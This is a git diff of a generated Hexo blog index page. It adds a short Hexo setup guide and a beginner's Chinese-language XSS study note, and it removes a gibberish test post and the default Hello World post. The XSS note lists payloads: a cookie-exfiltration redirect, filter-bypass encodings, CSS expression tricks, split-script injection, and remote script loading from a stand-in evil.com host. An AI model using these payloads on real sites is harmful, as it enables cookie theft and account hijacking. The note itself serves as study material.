@@ -61,6 +61,53 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-搭建一个博客" class="post-搭建一个博客 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2018/11/15/搭建一个博客/">搭建一个博客</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="https://github.com/synrdswd/Synrdswd.github.io/2018/11/15/搭建一个博客/" data-id="cjopaoqkt0000y8paorj82li0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>1.下载安装<a href="https://git-scm.com/downloads.js" target="_blank" rel="noopener">git</a>!<br>2.下载安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a>!<br>2.注册<a href="https://github.com">Github</a>!账号<br>3.打开git或者cmd，下载hexo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p>
+<p>4.进入想要安装的目录，创建文件夹（注意不要用汉语）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> </span><br><span class="line">mkdir blog</span><br><span class="line">hexo init myblog</span><br><span class="line"><span class="built_in">cd</span> myblog</span><br><span class="line">npm i</span><br></pre></td></tr></table></figure></p>
+<p>5.进入Github创建一个仓库<br>6.编辑配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi _config.yml</span><br></pre></td></tr></table></figure></p>
+<p>第六行title为标题，第九行author名字，<br>最后一行type改为type: git<br>type下面加一行repo: <a href="mailto:git@github.com">git@github.com</a>:xxx.git<br>这是在仓库ssh后面的一段<br>7.上传文章<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p>
+<p>之后就可以预览博客了<br>8.更换主题</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/11/15/搭建一个博客/">
+    <time datetime="2018-11-15T07:01:24.000Z" class="entry-date">
+        2018-11-15
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-xss-1" class="post-xss-1 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -76,14 +123,39 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="https://github.com/synrdswd/Synrdswd.github.io/2018/10/30/xss-1/" data-id="cjo1dgpwb0000y4paofetvg9h" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="https://github.com/synrdswd/Synrdswd.github.io/2018/10/30/xss-1/" data-id="cjopaoql30001y8pa53vivkkz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>  初学xss，xss分为三类。包括反射型，储存型和基于DOM型</p>
-
+        <h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><pre><code>初学xss，xss分为三类。包括反射型，储存型和基于DOM型
+</code></pre><h2 id="一-XSS使用方法"><a href="#一-XSS使用方法" class="headerlink" title="一.XSS使用方法"></a>一.XSS使用方法</h2><h3 id="1-简单XSS"><a href="#1-简单XSS" class="headerlink" title="1.简单XSS"></a>1.简单XSS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"XSS"</span>);&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"地址"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=<span class="string">"地址?cookie="</span>+escape(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/xysoul/article/details/45476739?locationNum=12&amp;fps=1" target="_blank" rel="noopener">所有代码</a>!</p>
+<h3 id="2-绕过XSS-Filter"><a href="#2-绕过XSS-Filter" class="headerlink" title="2.绕过XSS-Filter"></a>2.绕过XSS-Filter</h3><h4 id="（1）利用-lt-gt-标记注射html-javascript"><a href="#（1）利用-lt-gt-标记注射html-javascript" class="headerlink" title="（1）利用&lt;&gt;标记注射html/javascript"></a>（1）利用&lt;&gt;标记注射html/javascript</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="（2）利用html标签执行xss（需支持JavaScript-code-伪协议）"><a href="#（2）利用html标签执行xss（需支持JavaScript-code-伪协议）" class="headerlink" title="（2）利用html标签执行xss（需支持JavaScript:[code]伪协议）"></a>（2）利用html标签执行xss（需支持JavaScript:[code]伪协议）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>href= lowsrc= bgsound= background= value= action= dynsrc=这些都可以用来尝试</p>
+<h4 id="（3）空格回车Tab"><a href="#（3）空格回车Tab" class="headerlink" title="（3）空格回车Tab"></a>（3）空格回车Tab</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"javas	cript:alert(/xss/)"</span> width=100&gt;</span><br></pre></td></tr></table></figure>
+<p>注意中间的间隔是由Tab添加的。当然也可以使用空格，回车<br>原因主要是因为 javascript通常以；结尾，所以，没有把换行符解释为终止符</p>
+<h4 id="（4）对标签属性值转码"><a href="#（4）对标签属性值转码" class="headerlink" title="（4）对标签属性值转码"></a>（4）对标签属性值转码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句：&lt;img src=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br><span class="line">转码后：&lt;img src=<span class="string">"javascrip&amp;#116&amp;#58alert(/xss/);"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出将t的ASCII码116用”&amp;#116”表示,:表示为”&amp;#58”<br>同理，也可以将&amp;#01，&amp;#02等插入到javascript或VBScript的头部；<br>Tab的&amp;#9和换行的&amp;#10和回车的&amp;#13可以被插入到任意地方。<br>&amp;#01相当于&amp;#1，&amp;#09相当于&amp;#09；</p>
+<h4 id="（5）产生自己的事件"><a href="#（5）产生自己的事件" class="headerlink" title="（5）产生自己的事件"></a>（5）产生自己的事件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> value=<span class="string">"click me"</span> onlick=<span class="string">"alert('click me') /&gt;</span></span><br><span class="line"><span class="string">&lt;img src="</span><span class="comment">#" onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当鼠标点击按钮后，触发事件。或者加载图片出错，触发事件。<br>（onerror是img标记的一个事件，只要页面中发生错误，就被触发）</p>
+<h4 id="（6）利用css跨站"><a href="#（6）利用css跨站" class="headerlink" title="（6）利用css跨站"></a>（6）利用css跨站</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">"background-image:url(javascript:alert('xss'))"</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image: url(<span class="string">"javascript:alert('xss')"</span>);&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">IE5以后支持expression</span><br><span class="line">&lt;div style=<span class="string">"width: expression(javascript:alert('xss'))"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"#"</span> style=<span class="string">"xss:expression(alert(/xss/));"</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image: expression(alert(<span class="string">"xss"</span>));&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+<p>同样也可以将xss代码，写在文件里，利用link或者@import将其导入，<br>已达到注入的目的</p>
+<h4 id="（7）扰乱过滤规则"><a href="#（7）扰乱过滤规则" class="headerlink" title="（7）扰乱过滤规则"></a>（7）扰乱过滤规则</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">正常的：</span><br><span class="line">&lt;img src=<span class="string">"javascript:alert(0);"</span>&gt;</span><br><span class="line">转换大小写：</span><br><span class="line">&lt;IMG SRC=<span class="string">"javascript:alert(0);"</span>&gt;</span><br><span class="line">大小写混合：</span><br><span class="line">&lt;iMg sRC=<span class="string">"javascript:alert(0);"</span>&gt;</span><br><span class="line">不用双引号用单引号：</span><br><span class="line">&lt;img src=<span class="string">'javascript:alert(0);'</span>&gt;</span><br><span class="line">不用引号：</span><br><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br><span class="line">没有空格：</span><br><span class="line">&lt;img/src=<span class="string">"mars.png"</span>alt=<span class="string">"mars"</span>;&gt;</span><br><span class="line">&lt;img/src=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br><span class="line">使用expression时构造全角字符：</span><br><span class="line">&lt;div style=<span class="string">"&#123; left:ｅｘｐｒｅｓｓｉｏｎ(　alert('xss') ) &#125;"</span>&gt;</span><br><span class="line">样式表中用/**/或\或\0都被忽略：</span><br><span class="line">&lt;div style=<span class="string">"wid/****/th: espre/*XSS*/ssion(alert('xss'))"</span>&gt;</span><br><span class="line">@\0im\port<span class="string">'\0ja\vasc\ript:alert("xss")'</span>;</span><br><span class="line">css中关键字转码：</span><br><span class="line">&lt;p style=<span class="string">"xss:\65xpression(alert(/xss/))"</span>&gt;</span><br><span class="line">个别浏览器问题：</span><br><span class="line">&lt;!--&lt;img src=<span class="string">"--&gt;&lt;img src=x onerror=alert(1)//"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>转换大小写，大小写混合，不用双引号用单引号，不用引号，没有空格，<br>使用expression时构造全角字符，样式表中用/**/或\或\0都被忽略，<br>css中关键字转码，个别浏览器问题等都可以用来过滤</p>
+<h3 id="3-利用字符编码"><a href="#3-利用字符编码" class="headerlink" title="3.利用字符编码"></a>3.利用字符编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">十进制转码：</span><br><span class="line">&lt;img src=<span class="string">"&amp;#106&amp;#97......"</span>&gt;</span><br><span class="line">也可以在十进制字符后加；或&amp;<span class="comment">#0 &amp;#00 &amp;#0；等。例：</span></span><br><span class="line">&lt;img src=<span class="string">"&amp;#106;&amp;#97;......"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"&amp;#00106&amp;#0097......"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"&amp;#00000106;&amp;#0000097;......"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>除了十进制也可用十六进制。<br>在javascriptzj中有一个eval()函数，可以用\连接十六进制字符串，<br>然后用eval()执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"\x61\x6c......"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>eval()也可以执行十进制，不过需要String.fromCharCode()函数配合<br>string.fromcharcode()用于将字符串转化为ASCII<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原码：&lt;img src=<span class="string">"javascript:eval(alert('xss'))"</span>&gt;</span><br><span class="line">转换后：&lt;img src=javascript:<span class="built_in">eval</span>(String.fromCharCode(97,108,101......))<span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>此外，样式表等也支持用\连接十六进制<br>还有加密等方法<br>“### 4.拆分跨站法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">由于字数限制等原因，将注入代码拆分开来写</span><br><span class="line">&lt;script&gt;z=<span class="string">'document.'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'write("'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'&lt;script'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">' src=ht'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'tp://ww'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'w.shell'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'.net/1.'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'js&gt;&lt;/sc'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">'ript&gt;")'</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在使用拆分法时如果是一次注入，可以用/**/将中间的代码注释掉</p>
+<h3 id="4-Shellcode的调用"><a href="#4-Shellcode的调用" class="headerlink" title="4.Shellcode的调用"></a>4.Shellcode的调用</h3><h4 id="（1）远程调用JS"><a href="#（1）远程调用JS" class="headerlink" title="（1）远程调用JS"></a>（1）远程调用JS</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(<span class="string">"script"</span>);//创建新元素script</span><br><span class="line">s.src=<span class="string">"http://www.evil.com/xss.js"</span>;</span><br><span class="line">//把script的src属性设置成http ，xss.js里有shellcode代码</span><br><span class="line">document.getElementaByTagName(<span class="string">"head"</span>)[0].appendChild(s);</span><br><span class="line">/*查找并返回文档的第一个元素，再用appendChild()调用元素</span><br><span class="line">参数s，追加到指定节点的子节点列表的最后一个*/</span><br></pre></td></tr></table></figure>
+<h4 id="（2）使用window-location-hash"><a href="#（2）使用window-location-hash" class="headerlink" title="（2）使用window.location.hash"></a>（2）使用window.location.hash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http...?sort=<span class="string">"&gt;&lt;script&gt;eval(location.hash.substt(1))&lt;/script&gt;#alert('xss')</span></span><br></pre></td></tr></table></figure>
+<p>subst()可从字符串中抽取start（这里是1）开始的指定字符，即alert(‘xss’)</p>
+<h4 id="（3）XSS-Downloader"><a href="#（3）XSS-Downloader" class="headerlink" title="（3）XSS Downloader"></a>（3）XSS Downloader</h4><p>可以利用XMLHTTP技术等方法，远程读取shellcode代码</p>
+<h4 id="（4）备选储存技术"><a href="#（4）备选储存技术" class="headerlink" title="（4）备选储存技术"></a>（4）备选储存技术</h4><p>因为cookie等是客户端储存，可以利用XSS储存进去，然后把相关信息打印出来</p>
+<h2 id="二-XSS利用方法"><a href="#二-XSS利用方法" class="headerlink" title="二.XSS利用方法"></a>二.XSS利用方法</h2><h3 id="1-Cookie窃取"><a href="#1-Cookie窃取" class="headerlink" title="1.Cookie窃取"></a>1.Cookie窃取</h3><h2 id="三-XSS工具"><a href="#三-XSS工具" class="headerlink" title="三.XSS工具"></a>三.XSS工具</h2>
       
     </div><!-- .entry-content -->
 
@@ -91,102 +163,6 @@
     <a href="/2018/10/30/xss-1/">
     <time datetime="2018-10-30T07:58:52.000Z" class="entry-date">
         2018-10-30
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
-    <article id="post-1" class="post-1 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2018/10/30/1/">1</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="https://github.com/synrdswd/Synrdswd.github.io/2018/10/30/1/" data-id="cjo1dgpwk0001y4pamoivfxxk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>ffkjgzhdfdzxhfxchgjzfxvhnkfgzkjxhvzxkfjvzxfknvz<br>xzf<br>b<br>fghbgf<br>hngy<br>c<br>ny<br>ncgy</p>
-<p>jmy<br>hcnmyu<br>m,<br>ju</p>
-<p>k<br>ygcj<br>c<br>n<br>fdxytj</p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2018/10/30/1/">
-    <time datetime="2018-10-30T07:27:06.000Z" class="entry-date">
-        2018-10-30
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
-    <article id="post-hello-world" class="post-hello-world post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2018/10/29/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="https://github.com/synrdswd/Synrdswd.github.io/2018/10/29/hello-world/" data-id="cjo1dgpwo0002y4pac5xcdfuh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2018/10/29/hello-world/">
-    <time datetime="2018-10-29T13:44:29.588Z" class="entry-date">
-        2018-10-29
     </time>
 </a>
     
@@ -223,15 +199,11 @@
       <ul>
         
           <li>
+            <a href="/2018/11/15/搭建一个博客/">搭建一个博客</a>
+          </li>
+        
+          <li>
             <a href="/2018/10/30/xss-1/">xss_1</a>
-          </li>
-        
-          <li>
-            <a href="/2018/10/30/1/">1</a>
-          </li>
-        
-          <li>
-            <a href="/2018/10/29/hello-world/">Hello World</a>
           </li>
         
       </ul>
